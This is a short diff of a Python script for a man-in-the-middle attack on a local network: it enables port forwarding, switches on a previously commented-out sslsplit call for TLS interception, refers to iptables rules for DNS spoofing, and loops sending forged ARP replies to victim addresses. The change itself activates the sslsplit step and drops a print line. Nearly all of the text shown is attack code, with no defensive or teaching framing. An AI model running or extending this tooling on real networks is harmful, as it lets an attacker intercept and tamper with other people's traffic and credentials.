@@ -111,7 +111,7 @@ if __name__ == "__main__":
     enable_port_forwarding()
 
     # execute sslplit 
-    # sslsplit()
+    sslsplit()
 
     # iptables rules for dns spoofing
     os.system(
@@ -129,7 +129,6 @@ if __name__ == "__main__":
     try:
         while(1):
             # send arp relies spoofing
-            print(" ")
             for j in range(0,len(ip)):
                 if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                     victimpacket = ARP( op      =  2,
